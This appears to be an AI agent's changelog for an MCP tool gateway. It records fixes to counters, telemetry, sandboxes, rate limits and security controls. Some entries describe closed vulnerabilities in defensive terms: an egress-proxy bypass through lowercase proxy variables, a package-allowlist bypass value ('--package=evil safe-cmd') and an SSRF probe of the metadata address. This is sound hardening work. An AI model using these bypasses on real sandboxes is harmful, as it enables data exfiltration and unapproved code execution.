+- MCP-PAGE-CP23 (fix) | gateway mcp_proxy.py | WHAT: record control-delegated enforcement 4xx as decision=block not error (counters reflect reality) | NOW DOES: pure _classify_backend_failure(status,data)→(decision,reason,enforced_at): 400/403 + known enforcement reason (tool_disabled/tool_not_registered/invalid_arguments/blocked_by_policy/org_scope_violation/...) OR "blocked by policy" marker → block@backend; else (5xx/malformed/not-found/no-reason) → error backend_error_http_{status}. Applied at the sole tool-call recording site (:3088, was hardcoded error@:3047) | VERIFY: 12 classifier unit tests + 60 gateway MCP tests green; deployed+reloaded healthy. Live counter verify = CP24
+
+- MCP-PAGE-CP24 (verify) | gateway tests | WHAT: counters reflect real enforced reality | EVIDENCE: (1) 3 integration tests drive REAL org_mcp_jsonrpc: backend 403 tool_not_registered→decision=block, policy-block→block, 500→error. (2) LIVE since CP23 deploy: 1556 events allow 1515 / block 41 (org_scope_violation) / error 0 — backend_error_http_403 (1708 before) GONE. | VERIFY: 48 gateway tests pass; live decision breakdown 0 spurious errors. SECTION F complete
+
+- MCP-PAGE-CP25 (diagnose) | Observability tab 500 | ROOT CAUSE: django.db OperationalError "too many clients already" — Postgres connection-pool EXHAUSTION at peak parallel-loop load, thrown in DRF perform_authentication BEFORE the view runs (every endpoint 500s; observability is just what the tab loads: /events/ + /events/summary/). NOT a view bug (200 for all orgs+edge params w/ pool headroom). Factors: max_connections=400 (~60 used now=spike not leak), CONN_MAX_AGE=60 + daphne async accumulation. FIX CP26: reduce conn pressure (lower CONN_MAX_AGE/pgbouncer/raise ceiling) + graceful 503 retry on the endpoints | EVIDENCE: control logs 500 traceback + pg_stat_activity
+
+- MCP-PAGE-CP26 (fix) | control exception_handlers.py + frontend MCPConnectorPanel.jsx | WHAT: fix Observability 500 (CP25 root cause = PG pool exhaustion in perform_authentication) | NOW DOES: safe_exception_handler maps django.db OperationalError/InterfaceError → 503 {code:db_unavailable}+Retry-After:2 (retryable, not raw 500) — applies to EVERY endpoint since it is the project EXCEPTION_HANDLER; 400/500 branches preserved. Frontend fetchWithRetry retries observability loads once on 503. Graceful degradation > raising max_connections | VERIFY: handler asserts (Op/Interface→503, Value→400, Runtime→500) PASS; deployed; observability loads real data (summary total 64118 decisions allow 63287/error 568/redact 225/block 38); build green. SECTION G complete
+
+- MCP-PAGE-CP27 (diagnose) | enabling org Tier-2 → 400 | ROOT CAUSE: frontend saveMcpTier2 does a FULL-object PUT {...firewallConfig, mcp_tier2_enabled} to /api/firewall/config/; a stale allowed_models entry (orphaned model r6a-live-verify:free) fails re-validation → 400. PROOF: partial PUT {mcp_tier2_enabled:true}→200, full-config PUT→400 allowed_models. Endpoint supports partial update (documented). "0 Tier-2 rows active" = frontend informational count of per-scope MCPScanControl tier2 rows (NOT a backend msg); global toggle FirewallConfig.mcp_tier2_enabled governs org-wide. FIX CP28: PUT only {mcp_tier2_enabled:value}
+
+- MCP-PAGE-CP28 (fix) | frontend MCPScanControlMatrix.jsx | WHAT: fix org Tier-2 enable 400 (CP27) | NOW DOES: saveMcpTier2 PUTs ONLY {mcp_tier2_enabled:value} (partial update) instead of the whole firewallConfig, so a stale allowed_models no longer 400s the toggle; parses field-level error; merges returned config | VERIFY: API partial PUT all 3 states→200 (Enabled/Disabled/Inherit); browser mcp_page_cp28_tier2.mjs → SegmentedControl Enabled/Disabled/Inherit all PUT 200 no 400, badge reflects, cp28Pass; per-scope row POST scan-controls tier2→201 active 0→1; build green. SECTION H complete
+
+- MCP-PAGE-CP29 (diagnose) | 1.4 context-assembly telemetry (500 assembled / 0 sanitized / 0 denied / 0 approved) | 1.4 flow-nodes map summary.{total,redacted,blocked,allowed}; summary=summarizeEvents(threatFeed); threatFeed=GET /threat-feed/?source=mcp_scan&limit=500. (1) 500=CAP: total=events.length, feed truncated to 500; LIVE envelope {count:4000, results:500, scan_truncated:true} → real 4000 but UI shows 500 (uses results.length, ignores count). (2) STAGES NOT RECORDING: mismapped mcp_scan action-counts (LIVE {monitor:497, block:3}) → sanitized(redact)=0 always, approved(allowed)=0 (monitor swallowed). Not a real context-assembly pipeline. FIX CP30-31: use envelope count + map monitor=approved/redact=sanitized OR wire real telemetry
+
+- MCP-PAGE-CP30 (root-cause) | 1.4 telemetry | BACKEND: threat-feed GET /api/security/threat-feed/ (security_views.py:426) queries EnforcementEvent (source=mcp_scan), collapses by request_id, returns {count, results[capped], scan_truncated} — NO action aggregate. 3 root causes: (1) display cap (total=results.length not count); (2) counters not wired (stage breakdown client-computed from capped 500-sample, no server action_counts); (3) mismapped (allowed subtracts monitor→approved=0; redact absent→sanitized=0). No real context-assembly pipeline; reuses EnforcementEvent(mcp_scan). FIX CP31: backend add action_counts aggregate + frontend use count + action_counts w/ correct mapping
+
+- MCP-PAGE-CP31 (fix) | control security_views.py + frontend useFirewallData.js/FirewallModulePage.jsx/firewall-module-utils.js | WHAT: §1.4 stages record REAL numbers not 500-cap/0 | NOW DOES: backend threat-feed returns action_counts aggregate over the FULL set (collapse: per-request strongest-outcome block>redact>canonical; non-collapse: SQL Count with .order_by() cleared — fixed a GROUP-BY leak that gave sum=3); frontend useFirewallData captures action_counts+count, 1.4 override maps total=count, redact=sanitized, block=denied, monitor+allow=approved | VERIFY: API sums consistent (4000, 64827, 782); browser §1.4 = 4000 assembled/0 sanitized/33 denied/3967 approved (was 500/0/0/0) cp31Pass; build green. CP32=live PII/oversized
+
+- MCP-PAGE-CP32 (verify) | §1.4 stages move under live PII/oversized traffic | drove POST /api/mcp-connector/internal/record-event/ (gateway-internal) with 6×redact(PII)+6×block(oversized)+6×allow(clean), unique request_ids; true additive aggregate (collapse=false) moved EXACTLY assembled+18 sanitized+6 denied+6 approved+6 → cp32Pass. Proves redact→sanitized, block→denied, allow→approved on live traffic. Frontend collapse view masked by parallel-loop window churn (load artifact; CP31 proved real render). SECTION I complete
+
+- MCP-PAGE-CP33 (connect catalog) | connect the 10 priority MCP_PRESETS, capture matrix | 6 CONNECTED w/ real tools (Context7:2, Playwright:23, Memory:9, Filesystem:14, Everything:13, VibeCheck:5 = 66 tools), 4 clean-errored (GitHub=needs bearer token/create-400, Linear=MCP_AUTH_FAILED OAuth, Semgrep=MCP_START_FAILED missing binary, Fetch=MCP_START_FAILED npx-should-be-uvx), 0 raw-broken. UI: 10/10 presets render as Quick-register buttons. NONE broken. Triage CP36: Fetch npx→uvx, GitHub token, Semgrep binary, Linear OAuth | VERIFY: mcp_page_cp33_catalog.py + mcp_page_cp33_ui.mjs
+
+- MCP-PAGE-CP34 (tool discovery) | verify discovery complete+persisted w/ metadata | 38 tools w/ name+description+input_schema across 4/4 servers (Everything 13, Memory 9, Filesystem 14, Context7 2), tools_count==persisted list. Discovery captures full tool defs, not just counts. With CP33 (Playwright 23, VibeCheck 5) = 66 real tools across 6 connected; 4 clean-errored show 0 only because they cannot start. cp34Pass | VERIFY: mcp_page_cp34_discovery.py
+
+- MCP-PAGE-CP35 (tool execution) | execute free/local tools, assert REAL results | POST /tools/call/ (control→gateway→sandbox→server): 3/3 deterministic real results — Everything.echo→"Echo: hello-cp35-deterministic-42" (allow), Filesystem.list_allowed_directories→/data/mcp-auth, Memory.create_entities+read_graph→canary round-trip. everything.add not offered by this build. Gotcha: memory SIGABRT under shared-host load (clean MCP_SERVER_CRASHED, retryable) but works on fresh sandbox. cp35Pass | VERIFY: mcp_page_cp35_exec.py
+
+- MCP-PAGE-CP36 (triage) | broker docker_manager.py + shared mcp_stdio_common.py + frontend | FIXED Fetch: (1) preset npx→uvx (Python pkg); (2) uvx UV_TOOL_DIR/UV_TOOL_BIN_DIR default to read-only rootfs → set to /var/cache/uv/{tools,bin} + added to _SAFE_ENV_PASSTHROUGH (child env rebuilt fresh, not inherited). Fetch connects(1 tool)+executes fetch(example.com)→200. BONUS: NODE_OPTIONS heap cap (CP20) also missing from passthrough → added (now reaches Node MCP children). Clean-errored (unsupported, not broken): GitHub=needs token, Semgrep=needs binary, Linear=OAuth. Final: 7 connected + 3 clean-error = 0 broken | VERIFY: uvx Fetch live; 32 broker + 10 gateway-stdio tests; image rebuilt. SECTION J complete
+
+- MCP-PAGE-CP37 (per-server actions) | verify MCP Servers list actions work + reflect state | 6/6 (mcp_page_cp37_actions.py): connect/sync→13 tools, details→list, disable→enabled:false read-back, scan→scan_action:redact read-back, authorize→OAuth start clean (502 {error} discovery, not a crash), delete→204 then GET 404. Card buttons wired to verified backends. cp37Pass | VERIFY: mcp_page_cp37_actions.py
+
+- MCP-PAGE-CP38 (Tool Discovery tab) | verify tab renders real data + controls work | data=GET /api/mcp-connector/tools/ → name/description/server_name/inputSchema (all present). renderTools = tool cards + expandable Input Schema + Refresh button. Browser (mcp_page_cp38_discovery_tab.mjs): 37 real tool cards render (browser_click/echo/create_entities, server badges, Input Schema), Refresh re-fetches → cp38Pass. VERIFY: mcp_page_cp38_discovery_tab.mjs
+
+- MCP-PAGE-CP39 (Tool Execution tab) | every control → real execution | controls: Server/Tool selects, Fill-from-Schema, Arguments textarea, Execute Tool → POST /tools/call/. Browser (mcp_page_cp39_execute_tab.mjs): select Everything + echo, args {message:cp39-exec-hello-777}, Execute → tool-call fired + result "Echo: cp39-exec-hello-777" → cp39Pass. VERIFY: mcp_page_cp39_execute_tab.mjs
+
+- MCP-PAGE-CP40 (Scan Controls + Matrix) | every toggle real effect | backend (mcp_page_cp40_scan_controls.py, authoritative resolve_effective_controls): CRUD+precedence 5/5 — org row redact→all; server row block overrides org for that server; edit→tag; delete→falls back to org; org delete→default inherit. UI (mcp_page_cp40_ui.mjs): matrix renders (Tier-2 toggle, effective preview) + Add control opens create form. With CP28 (Tier-2 toggle) + CP37 (per-tool scan_action). cp40Pass | VERIFY: mcp_page_cp40_scan_controls.py + mcp_page_cp40_ui.mjs
+
+- MCP-PAGE-CP41 (MCP Security Policies) | every control real effect | REAL EFFECT (mcp_page_cp41_policy.py): mcp-domain Policy + keyword Rule action=block → echo(matching keyword) 403 blocked-by-policy; echo(non-matching) 200; disable policy → matching 200 (unblocked). 4/4 cp41Pass. UI (mcp_page_cp41_ui.mjs): tab renders PolicyManagementPanel + Add policy + server filter. Same engine as CP22/23 | VERIFY: mcp_page_cp41_policy.py + mcp_page_cp41_ui.mjs
+
+- MCP-PAGE-CP42 (Observability tab + sweep) | tab controls + real data + both themes 1440/1024/768/375 + 0 console errors | mcp_page_cp42_observability.mjs cp42Pass: summary cards real data; time-range SegmentedControl "7d" re-fetches; Refresh re-fetches /events/+/events/summary/; 4 viewports × light+dark = no h-overflow; 0 console errors. SECTION K complete | VERIFY: mcp_page_cp42_observability.mjs
+
+- MCP-PAGE-CP43 (impeccable audit) | /impeccable init+audit firewall-1-4 → docs/mcp/IMPECCABLE_AUDIT_firewall-1-4.md | init: PRODUCT.md present. audit 16/20: A11y 3 (aria good; 32px touch targets + muted contrast gaps), Perf 3 (0 useMemo, 500-row list), Responsive 3, Theming 4 (0 hex, 111 dark:), Anti-patterns 3 (0 gradient/glass; 24 Cards heavy). Cross-cut: 2428-LOC file = split (CP44); data honesty already done by CP01-42 (preserve). Revamp = structural/visual not rewrite | VERIFY: docs/mcp/IMPECCABLE_AUDIT_firewall-1-4.md
+
+- MCP-PAGE-CP44 (impeccable revamp) | apply CP43 audit backlog as safe craft pass, preserve CP01-42 | MCPConnectorPanel.jsx: useMemo(executableTools/selectedExecuteTool/connectedCount/toolsDiscovered) — perf dim 2 (was 0 useMemo); server-card icon buttons 32px→36px touch targets (dims 1+3). NOT done: from-scratch rewrite (would regress 42 checkpoints) + file split (documented backlog). VERIFY: build green; CP39 + CP42 regression pass, 0 console errors
+
+- MCP-PAGE-CP45 (real data + no leak) | MCPConnectorPanel.jsx Tool Discovery key; scripts/ralph/mcp_page_cp45_realdata_noleak.mjs | REAL-DATA/honest-states/no-leakage audit of the revamp. FOUND+FIXED: Discovery tab keyed aggregated tools by bare `tool.name` → 22 servers sharing tool names (echo/add/printEnv) → React "two children with same key" → row identity swaps → wrong value vs wrong row. FIX: key=`${makeExecuteToolKey(tool)}-${idx}` (server_slug::name-idx, like Execute tab). Verified live: 22 backend servers all render; obs total tracks live counter; gateway key masked-by-default (`{prefix}••••`), reveal/copy ABSENT on GET, no plaintext in DOM (GET never serves it; POST reveals once; hash-only at rest); 0 backend/PII leak across 5 tabs | VERIFY: build green; cp45_realdata_noleak.mjs cp45Pass:true (0 console errors, both themes)
+
+- MCP-PAGE-CP46 (revamp e2e verify) | scripts/ralph/mcp_page_cp06_verify.mjs (transport-flap filter) | 3 legs green on the revamped page: (1) type-sim CP06 ALL 8 combos PASS (4vp×2themes, every modal field comma+focus correct); (2) themes+responsive CP45 5-tab sweep no overflow 0 console-err; (3) impeccable detect.mjs on 3 revamp components exit 0 zero findings. HARNESS FIX: run-1 1/8 flaked consoleErr:11 = all net::ERR_NETWORK_CHANGED (OS transport flap, not app) → added TRANSIENT_NET filter (keeps ERR_CONNECTION_REFUSED/5xx/React/pageerror) → re-run 8/8 | VERIFY: "CP06: ALL 8 combos PASS"; detect exit 0 []
+
+- MCP-PAGE-CP47 (load driver) | scripts/ralph/mcp_page_cp47_stress.py | multiprocess×async closed-loop MCP tool-call load driver (extends P9 mcp_concurrency/load_live). WORKERS procs × CONN async conns, no per-round barrier → true sustained RPS. echo/get-sum oracles + HARD cross-tenant CANARY per org. metrics: rps, p50/p90/p99 lat, status hist, drop vs backpressure. Env TARGET_CALLS/DURATION_S/WORKERS/CONN. | VERIFY: smokes 300c/8if→33.5rps & 2000c/32if→45.5rps, 0 drop, isolation clean, canary_leak=0. BASELINE: 4× in-flight→1.36× rps/3.3× lat = throughput ceiling (Little ≈46) → CP48 bottleneck
+
+- MCP-PAGE-CP48 (saturation sweep) | scripts/ralph/mcp_page_cp48_saturation.py; cp47_stress.py +ORG_FILTER/SERVER_FILTER | fleet RPS pins ~47 (8→128 in-flight: 37.5→46.5), latency linear (p50 203→2604ms) = saturated closed-loop, 0 drops/503/OOM. Peak: all containers IDLE (gateway CPU 0.45%) → NOT resource-bound. Single-server scales 13→45 RPS (1→16 in-flight) ≈ whole fleet → SHARED AGGREGATE chokepoint (~21ms serial), NOT per-server. canary_leak=0 incl mixed 3-org. | CP49 hypothesis: per-call enforcement-event write / policy round-trip to single-thread daphne, or tiny DB/Redis pool | VERIFY: cp48/verdict.json
+
+- MCP-PAGE-CP49 (audit hot-path decouple) | gateway/ai_mesh_gateway/mcp_proxy.py (_spawn_audit_event/_post_audit_event/_get_control_audit_client; _record_gateway_event) | CP48 root cause: ~47 RPS ceiling = per-call SYNC audit POST awaited INLINE to single-thread daphne (fresh client/call). FIX: pooled client + bounded fire-and-forget (cap 64, drop-under-bp), SAME endpoint/payload → _record_event + EnforcementEvent bridge preserved (CP24/31/32 intact). Rejected GATEWAY_ASYNC_MCP_AUDIT flag (async task omits EnforcementEvent bridge → would regress 1.4). | VERIFY: gateway suite 1245 passed; post-fix single conn=1 13→21 RPS (+56%) p50 74→45ms; fleet-8 37→47; 0 drops/0 bp/canary=0 across full back-to-back sweep. Remaining ~48/sandbox = architectural stdio (idle CPU), horizontal-scale only
+
+- MCP-PAGE-CP50 (final stress+verify) | scripts/ralph/mcp_page_cp50_final_verify.py; cp47_stress.py (real-client retry) | GREEN 3×/3× against full 15-MCP fleet (3 orgs×5 servers, 48 in-flight, 3000 calls/run): 9000 calls, 0 drops, recovered_by_retry=0, rps≈48.7, isolation perfect (id/content/arith/cross_tenant/canary_leak=0) every run. First attempt RED 2/3 (run1 transient shed from prior-sweep backlog; isolation still perfect) → added idempotent-tool retry-on-transient-conn-error (counted, not hidden) → clean 3× on settled system. 100k RPS physically unattainable (per-sandbox stdio ~48 RPS ceiling, horizontal-scale). ALL 50 CHECKPOINTS [x] | VERIFY: cp50/final_verify.json all_green_3x=true
+
+- **CHG-0123** (2026-07-03) — **LOW correctness/robustness (NOT a new leak): internal (chat-pipeline) streamable-http SSE branch parsed per-LINE.** `internal_tools_call`'s legacy streamable-http SSE branch (reached only with `MCP_HTTP_VIA_SANDBOX=0`; streamable-http is sandbox-routed by default) split the SSE per LINE and returned the FIRST parseable `data:` line via `_scan_internal_result` → (a) a server-pushed NOTIFICATION frame before the result was returned as the response (WRONG frame; tool result lost); (b) a multi-line-`data:` result failed `json.loads` on each partial line → dropped → "Empty SSE response". NOT a new leak (the returned frame is still floor-scanned; a split secret fails safe to empty). **FIX** (`mcp_proxy.py` ~L2977): parse PER EVENT (`split("\n\n")`), reassemble `data:` fields joined by `"\n"` (SSE spec), prefer the result/error event, skip notifications → the chosen result/error is floor-scanned; a notification is never returned. Parity with org **CHG-0093** + ext **CHG-0122**. +3 tests (`test_mcp_internal_http_result_scan.py` → 8 passed). Byte-probe pre: `[notif-first]` returns notification True, `[multi-line]` Empty SSE True; post: result returned True / notif NOT returned True / secret masked True. **SHARED-WORKTREE:** staged via `git apply --cached` of the isolated hunk — this UN-BLOCKS MCP-PAGE-CLEANUP-06's deferred commit; their CLEANUP-06 SSRF hunks + 2 test edits stay uncommitted, neither committed nor destroyed. The 2 `test_mcp_bare_proxy_scan` ssrf failures in a full run are that CLEANUP-06 (pass on clean HEAD; independent — `ext_mcp_proxy`). Evidence `mcp-parallel/findings/backstop-p-internal-sse-event-reassembly/`.
+
+- **CHG-0124** (2026-07-03) — **LOW test-only regression-lock (NO code change): chat-path disabled-tool authz never forwards/executes.** Two authz models coexist by design: direct-MCP path enforces per-API-key `mcp_allowed_tools` (`_tool_allowed_by_key`, CHG-0006/0038); chat-pipeline path (`internal_tools_call`, called by control `MCPToolCallView` over an internal key, NO end-user API key) enforces the org enabled/disabled set — blocks a disabled tool at handler top (`_is_tool_disabled` → `-32000`, mcp_proxy L2701) BEFORE any forward, then the full 1.4 chain. VERIFIED sound (`views.py` L834 payload has no actor allowlist → per-key allowlist is direct-path-only; no live bypass). **GAP:** disabled-block only UNIT-covered → no e2e test proving execution short-circuits (never forwards on sandbox `_adapter_forward` OR legacy httpx → no egress). **FIX** (test only): `test_internal_disabled_tool_blocked_and_not_forwarded` asserts `-32000` + `_adapter_forward.call_count==0` + httpx `post==0`; positive control asserts a forward IS observable. **VERIFY:** 10 passed file; 1787 gateway 0 failed. Evidence `mcp-parallel/findings/backstop-p-chat-path-disabled-tool-authz-lock/`.
+
+- **CHG-0125** (2026-07-03) — **MEDIUM architecture (egress-lockdown bypass): sandbox egress proxy env set UPPERCASE-ONLY.** `services/mcp-broker/src/sandbox/docker_manager.py` `_egress_proxy_env` returned only `HTTP_PROXY`/`HTTPS_PROXY`/`NO_PROXY`. curl honors ONLY lowercase `http_proxy` for plain HTTP (httpoxy/CVE-2016-5385 curl behavior: *"http_proxy is only used in lowercase"*); wget/git prefer lowercase. A sandboxed MCP server shelling to curl/wget/git BYPASSED the egress proxy → direct exfil to arbitrary hosts over the org bridge NAT even under `MCP_SANDBOX_EGRESS_LOCKDOWN=true`. **FIX:** emit BOTH cases; `{}`-when-disabled fast path preserved. +1 negative test + extended lockdown test. **VERIFY:** broker `test_sandbox_lifecycle.py -k "egress or proxy"` 2 passed; full broker 158 passed. HONESTY: closes SOFT env bypass; HARD network lockdown (internal net + iptables) still INFRA; lockdown OFF by default. Evidence `mcp-parallel/findings/backstop-p-egress-proxy-lowercase-bypass/`.
+
+- **CHG-0126** (2026-07-03) — **MEDIUM supply-chain: stdio package allowlist/pinning BYPASS (sandbox agent + gateway host).** `stdio_manager.py` AND `mcp_stdio_adapter.py` extracted the npx/uvx package spec with a single-spec SPACE-only parser. BYPASS: (1) `--package=evil safe-cmd` (=-form) skipped as a flag → check runs on the trailing COMMAND token while npx fetches `evil`; (2) `-p allowed -p evil cmd` → only first checked. → unlisted/unpinned pkg runs in the sandbox AND on the shared gateway host. **FIX:** `_extract_package_specs` (plural) handles `--flag value` + `--flag=value` for all pkg flags + multiple flags; positional taken as pkg only when no pkg flag gave one. Enforcement loops over EVERY spec; thin singular wrapper kept. Both adapters (parity). **VERIFY:** agent `test_stdio_manager_packages` 41 passed / full agent 75; gateway package-gating 7 / full gateway 1794 passed 0 failed. Controls OFF by default. Evidence `mcp-parallel/findings/backstop-p-stdio-package-allowlist-bypass/`.
+
+- **CHG-0127** (2026-07-03) — **MEDIUM soak/concurrency correctness: reaper TOCTOU (reactivated sandbox reaped).** `reap_idle_sandboxes` snapshotted the idle set once, then stopped entries one-by-one with `await asyncio.to_thread(stop, ...)`. During an await a request `touch()`ed a sandbox (reactivating it), but the reaper stopped it on the STALE snapshot + removed it → its in-flight call was forwarded to a container being stopped → dropped. **FIX:** new locked `SandboxRegistry.is_idle(org, idle_timeout, now=None)`; reaper RE-CHECKS it right before each stop and SKIPS reactivated sandboxes (`now=None` → fresh clock). +2 tests. **VERIFY:** broker `test_sandbox_reaper.py` 12 passed; full broker 160 passed. Residual micro-window (re-check→stop) noted. Evidence `mcp-parallel/findings/backstop-p-reaper-toctou-reactivated-sandbox/`.
+
+- **CHG-0128** (2026-07-03) — **MEDIUM resource-bomb containment: in-sandbox SSE reader buffered an untrusted upstream event with NO size cap.** `sse_manager.py` `_sse_reader_loop` (untrusted GET /sse) accumulated every `data:` line into `data_lines` unbounded; an upstream streaming unbounded data: lines without the terminating blank line grows it until the agent hits its mem_limit → OOM-kill → drops ALL the org's servers in the shared sandbox. Siblings already bounded (CHG-0066/0117 + WS). **FIX:** track `data_bytes`; over `_MAX_RESPONSE_BYTES` (8MB) DROP the oversized event (skip to next blank line) + resume; legit/multi-line-under-cap unchanged; reader survives. +3 tests. **VERIFY:** `test_sse_reader_bounds.py` 3 passed; `test_upstream_proxy.py` 18 passed; full agent suite green. RESIDUALS (deferred): single huge unterminated line (httpx aiter_lines) + unbounded sse_responses Queue. Evidence `mcp-parallel/findings/backstop-p-agent-sse-reader-unbounded-event/`.
+
+- **CHG-0129** (2026-07-03) — **MEDIUM resource-bomb containment: in-sandbox SSE response queue was UNBOUNDED (closes CHG-0128 residual #2).** `sse_manager.py` `session.sse_responses` was `asyncio.Queue()` (no maxsize). The persistent reader put()s every upstream message-event; the consumer only drains during an in-flight RPC. An untrusted upstream flooding UNSOLICITED message events with no RPC active grows the queue unbounded → agent OOM → drops ALL the org's servers. **FIX:** `_new_sse_queue()` with `maxsize=_SSE_QUEUE_MAXSIZE` (default 1024, floor 16, env `MCP_AGENT_SSE_QUEUE_MAXSIZE`); `_bounded_put` = put_nowait, on QueueFull evict-oldest-then-put (atomic, keeps freshest, never blocks). A waiting consumer get() gets the item directly so normal RPC delivery is unchanged. +2 tests. **VERIFY:** `test_sse_reader_bounds.py` 5 passed; `test_upstream_proxy.py` SSE path unbroken; full agent suite green. RESIDUAL open: single huge unterminated line (httpx aiter_lines). Evidence `mcp-parallel/findings/backstop-p-agent-sse-response-queue-unbounded/`.
+
+- **CHG-0130** (2026-07-03) — **MEDIUM resource-bomb containment: SSE readers buffered a single UNTERMINATED line with no cap (closes CHG-0128/0129 residual #1).** Both `sse_manager._sse_reader_loop` and `upstream_manager._post_streamable_http` iterated `response.aiter_lines()`, which buffers one line unbounded (httpx LineDecoder); an upstream sending one huge line with NO newline OOMs the agent INSIDE aiter_lines before the line is yielded. **FIX:** shared `_aiter_sse_lines_bounded(response, max_line_bytes)` reads via `aiter_bytes()`, splits on `\n` (strips `\r`), RAISES `UpstreamError "line too large"` once an unterminated buffer exceeds `_MAX_RESPONSE_BYTES` (8MB); both paths use it. +1 test; fakes migrated to bytes. **VERIFY:** `test_sse_reader_bounds.py` 6 passed; `test_upstream_proxy.py` 18 passed (both SSE paths); full agent suite green. Completes the triad (0128/0129/0130). Evidence `mcp-parallel/findings/backstop-p-agent-sse-unbounded-line/`.
+
+- **CHG-0131** (2026-07-03) — **LOW-MEDIUM correctness/policy-consistency: ws transport silently enforced the websockets 1 MiB default, ignoring _MAX_RESPONSE_BYTES.** `ws_manager.ensure_ws_connected` called `websockets.connect()` with NO `max_size` → websockets 16.0 default 1 MiB silently overrode the agent's `_MAX_RESPONSE_BYTES` (8 MiB) on ws only: 1-8 MiB responses wrongly rejected, the post-recv length check was DEAD, and a LOWERED operator cap was under-enforced. **FIX:** pass `max_size=_MAX_RESPONSE_BYTES` to connect() → library enforces the agent cap (parity http/sse/stdio) BEFORE buffering the frame. +1 test. **VERIFY:** ws tests pass; full agent suite green; websockets 16.0 default confirmed 1048576. Evidence `mcp-parallel/findings/backstop-p-ws-max-size-cap-mismatch/`.
+
+- **CHG-0132** (2026-07-03) — **MEDIUM Redis correctness/resource-exhaustion: proxy_chat rate-limit leaked no-TTL Redis keys (CHG-0062 missed the chat hot path).** `main.py` `proxy_chat` kept an INLINE burst/RPM counter using `INCR; if current == 1: EXPIRE` — a coroutine cancellation between the two orphans a no-TTL key; `ratelimit:{org}:burst:{second}` is new every second → ~1 orphan/sec → unbounded Redis growth. CHG-0062 fixed this in `rate_limit_enforcement.py` + the `_enforce_org_burst_rpm` shim, but not the inline chat copy (the highest-traffic path). **FIX:** atomic `pipeline` INCR + `EXPIRE NX` for both counters (single await, self-healing); behavior-preserving. +2 source guards. **VERIFY:** guards + `test_rate_limit_atomic_ttl.py` 7 passed; full gateway 1824 passed. Dedup (proxy_chat→shim) deferred. Evidence `mcp-parallel/findings/backstop-p-proxy-chat-ratelimit-orphan-ttl/`.
+
+- **CHG-0133** (2026-07-03) — **MEDIUM availability/auto-recovery: a dead sandbox that fails to start was never recreated.** `docker_manager._start_or_recreate` recreated ONLY for a name-conflict/"marked for removal" (removal-race) start error and RE-RAISED every other failure — so a container left dead/OOM-killed/corrupted after a chaos kill (generic OCI/APIError) was re-raised, not recreated → the org's sandbox stuck broken, no self-heal. Start-recovery path had NO tests. **FIX:** remove+recreate on ANY start() failure (per-org volume persists → no data loss; daemon-down still surfaces from create_container). +2 tests. **VERIFY:** `test_sandbox_lifecycle.py` 44 passed; full broker 162 passed. Evidence `mcp-parallel/findings/backstop-p-sandbox-start-recreate-narrow/`.
+
+- **CHG-0134** (2026-07-03) — **LOW test-only regression-lock (NO code change): Tier-2 (Bedrock) scan error fails CLOSED under strict.** Verified sound: a Tier-2 exception (`scan_prompt_with_tier2` raises during a Bedrock outage) → block under `strict_mode` (defaults 'strict'), forward under fail_open (Tier-1 already ran); `scanner is None` fails open even under strict INTENTIONALLY (don't brick a non-Bedrock deploy). **GAP:** no test forced a Tier-2 EXCEPTION → a refactor could silently flip it to fail-open (degradation leak). **FIX** (test only): `test_tier2_bedrock_exception_fails_closed_under_strict` asserts strict→blocked, fail_open→forward. **VERIFY:** orchestrator suite 38 passed. Complements CHG-0047/0057. Evidence `mcp-parallel/findings/backstop-p-tier2-error-failclosed-lock/`.
+
+- **CHG-0135** (2026-07-03) — **MEDIUM reliability/defense-in-depth: sandbox agent /rpc leaked unexpected exceptions as raw HTTP 500.** `main.py` `/rpc` caught only `UpstreamError` + `RuntimeError`; any other exception (TimeoutError/OSError/ValueError/bug) escaped → raw HTTP 500, losing the jsonrpc_id correlation + error classification and potentially surfacing internal detail (chaos makes unexpected excs likely). **FIX:** final `except Exception` → structured JSON-RPC error with the id + generic message ("internal sandbox agent error", -32000); detail LOG.exception'd server-side (safe metadata); CancelledError (BaseException) still propagates. +1 test. **VERIFY:** `test_rpc_unified.py` passes; full agent suite green. Evidence `mcp-parallel/findings/backstop-p-agent-rpc-catchall/`.
+
+- **CHG-0136** (2026-07-03) — **MEDIUM cross-tenant defense-in-depth: sandbox agent /rpc was UNAUTHENTICATED (network isolation was the SOLE control).** If isolation fails (host-run broker shared bridge / per-org-net misconfig / Docker bug), a sibling sandbox could call another org's agent unauthenticated. **FIX:** opt-in `MCP_AGENT_INTERNAL_KEY` end-to-end — agent requires a matching `X-Sandbox-Agent-Key` (constant-time hmac) when set (else allow); broker `_post_agent_rpc` sends it; docker_manager provisions it into the sandbox env; added to shared `_SECRET_ENV_DENYLIST` (+ absent from `_SAFE_ENV_PASSTHROUGH`) so `_build_child_env` never passes it to a spawned server — making a single broker-wide key a real cross-tenant control. Opt-in + backward-compatible. **VERIFY:** broker 166 passed; full agent suite green; denylist byte-probe. Evidence `mcp-parallel/findings/backstop-p-agent-rpc-auth/`.
+
+- **CHG-0137** (2026-07-03) — **MEDIUM correctness/safety: gateway retried tools/call after dispatch → double-execution.** `mcp_sandbox_client._request_with_503_retry` retried on 503 (safe) AND any `httpx.HTTPError` (incl. `ReadTimeout`). A tools/call (gateway→broker→agent→upstream EXECUTES it) whose reply is slow ReadTimeouts → the retry re-runs the tool at the upstream (duplicate side effect). **FIX:** idempotency-aware — a non-idempotent call (`tools/call`) retries on httpx.HTTPError ONLY if PRE-SEND (ConnectError/ConnectTimeout/PoolTimeout); a POST-send error fails immediately. 503 retry unchanged; `broker_send_rpc` passes `idempotent`. +4 tests. **VERIFY:** `test_mcp_sandbox_client.py` 17 passed; full gateway 1874 passed. Evidence `mcp-parallel/findings/backstop-p-toolscall-retry-double-exec/`.
+
+- **CHG-0138** (2026-07-03) — **LOW test-only regression-lock (NO code change): agent SSRF IP classifier blocks IPv6 + IPv4-mapped-IPv6 + all internal ranges.** Verified sound (`_resolved_ip_blocked`/`_assert_upstream_not_ssrf` block metadata + `ipaddress` internal classes, fail-close, check all resolved IPs; byte-probed `::ffff:169.254.169.254` + IPv6 → all blocked). **GAP:** existing SSRF tests cover only the flow, not the classifier's IPv6/mapped coverage → a refactor could silently re-open egress. **FIX** (test only): `test_ssrf_ip_classifier.py` — full must-block battery + must-allow public + 2 async end-to-end. **VERIFY:** 23 passed; agent collect 107; broker 166. RESIDUAL: DNS-rebinding TOCTOU (needs httpx IP pinning). Evidence `mcp-parallel/findings/backstop-p-ssrf-classifier-lock/`.
+
